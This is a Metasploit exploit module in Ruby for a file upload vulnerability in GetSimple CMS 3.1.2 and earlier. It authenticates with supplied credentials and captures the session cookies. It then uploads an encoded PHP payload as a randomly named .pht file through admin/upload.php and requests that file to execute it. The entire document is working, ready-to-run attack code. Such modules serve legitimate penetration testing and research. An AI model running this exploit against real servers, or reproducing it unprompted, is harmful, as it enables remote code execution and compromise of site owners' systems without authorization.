# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;GetSimpleCMS PHP File Upload Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a file upload vulnerability in GetSimple CMS. By abusing the
        upload.php file, a malicious authenticated user can upload an arbitrary file,
        including PHP code, which results in arbitrary code execution.
      },
      &#039;Author&#039;         =>
        [
          &#039;Ahmed Elhady Mohamed&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;25405&#039;],
          [&#039;OSVDB&#039;, &#039;93034&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00",
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;Generic (PHP Payload)&#039;, {}]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 04 2014&#039;
    ))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The full URI path to GetSimplecms&#039;, &#039;/GetSimpleCMS&#039;]),
      OptString.new(&#039;USERNAME&#039;, [true, &#039;The username that will be used for authentication process&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [true, &#039;The right password for the provided username&#039;])
    ], self.class)
  end

  def send_request_auth
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path.to_s, "admin", "index.php"),
      &#039;vars_post&#039; => {
        &#039;userid&#039;    => "#{datastore[&#039;USERNAME&#039;]}",
        &#039;pwd&#039;       => "#{datastore[&#039;PASSWORD&#039;]}",
        &#039;submitted&#039; => &#039;Login&#039;
      }
    })

    res
  end

  def send_request_upload(payload_name, cookie_http_header)
    data = Rex::MIME::Message.new
    data.add_part("<?php #{payload.encoded} ?>", &#039;application/x-httpd-php&#039;, nil, "form-data; name=\"file[]\"; filename=\"#{payload_name}\"")
    data.add_part("Upload", nil, nil, "form-data; name=\"submit\"")

    data_post = data.to_s

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path.to_s, "admin", "upload.php"),
      &#039;vars_get&#039; => { &#039;path&#039; =>&#039;&#039; },
      &#039;cookie&#039;   => cookie_http_header,
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;     => data_post
    })

    res
  end

  def check
    res = send_request_cgi({&#039;uri&#039; => normalize_uri(target_uri.path.to_s, &#039;admin&#039;, &#039;index.php&#039;)})

    if res && res.code == 200 && res.body && res.body.to_s =~ /GetSimple CMS.*Version\s*([0-9\.]+)/
      version = $1
    else
      return Exploit::CheckCode::Unknown
    end

    print_status("#{peer} - Version #{version} found")

    if Gem::Version.new(version) <= Gem::Version.new(&#039;3.1.2&#039;)
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{peer} - Authenticating...")
    res = send_request_auth

    if res && res.code == 302
      print_status("#{peer} - The authentication process is done successfully!")
    else
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    end

    print_status("#{peer} - Extracting Cookies Information...")
    cookie = res.get_cookies
    if cookie.blank?
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    end

    print_status("#{peer} - Uploading payload...")
    payload_name = rand_text_alpha_lower(rand(10) + 5) + &#039;.pht&#039;
    res = send_request_upload(payload_name, cookie)

    if res && res.code == 200 && res.body && res.body.to_s =~ /Success! File location.*>.*#{target_uri.path.to_s}(.*)#{payload_name}</
      upload_path = $1
      print_good("#{peer} - File uploaded to #{upload_path}")
      register_file_for_cleanup(payload_name)
    else
      fail_with(Failure::Unknown, "#{peer} - Upload failed")
    end

    print_status("#{peer} - Executing payload...")
    send_request_raw({
      &#039;uri&#039; => normalize_uri(target_uri.path.to_s, upload_path, payload_name),
      &#039;method&#039; => &#039;GET&#039;
    }, 5)
  end

end

